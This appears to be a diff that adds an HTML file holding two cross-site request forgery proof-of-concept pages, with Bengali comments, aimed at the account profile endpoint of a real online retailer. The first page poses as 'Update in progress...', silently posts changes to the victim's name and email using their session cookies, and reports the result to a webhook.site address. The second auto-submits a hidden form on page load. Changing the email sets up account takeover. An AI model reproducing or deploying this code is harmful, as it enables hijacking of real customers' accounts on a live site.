@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html>
+<body>
+    <h1>Update in progress...</h1>
+    <script>
+        // ১. ভিক্টিমের তথ্য পরিবর্তন করার রিকোয়েস্ট (Exploit)
+        fetch("https://www.vidaxl.com.au/on/demandware.store/Sites-vidaxl-au-Site/en_AU/Account-SaveProfile", {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
+            },
+            body: "dwfrm_profile_customer_firstname=HACKED&dwfrm_profile_customer_lastname=BY_NEW&dwfrm_profile_customer_email=your-email@example.com&csrf_token=", 
+            credentials: 'include' // এটি ভিক্টিমের সেশন কুকি ব্যবহার করবে
+        })
+        .then(response => {
+            // ২. ফলাফল আপনার Webhook-এ পাঠানো
+            fetch("https://webhook.site/bb29ec8b-4687-4463-a63c-9468fd24d200", {
+                method: "POST",
+                body: "Attack Status: " + response.status
+            });
+        });
+    </script>
+</body>
+</html>
+<!DOCTYPE html>
+<html>
+<body onload="document.forms[0].submit()">
+    <h2>Processing... Please wait</h2>
+    <form action="https://www.vidaxl.com.au/on/demandware.store/Sites-vidaxl-au-Site/en_AU/Account-SaveProfile" method="POST">
+        <input type="hidden" name="dwfrm_profile_customer_firstname" value="Hacked_By_New" />
+        <input type="hidden" name="dwfrm_profile_customer_lastname" value="Security_Test" />
+        <input type="hidden" name="dwfrm_profile_customer_email" value="আপনার_ইমেইল@example.com" />
+        <input type="hidden" name="csrf_token" value="" /> </form>
+</body>
+</html>
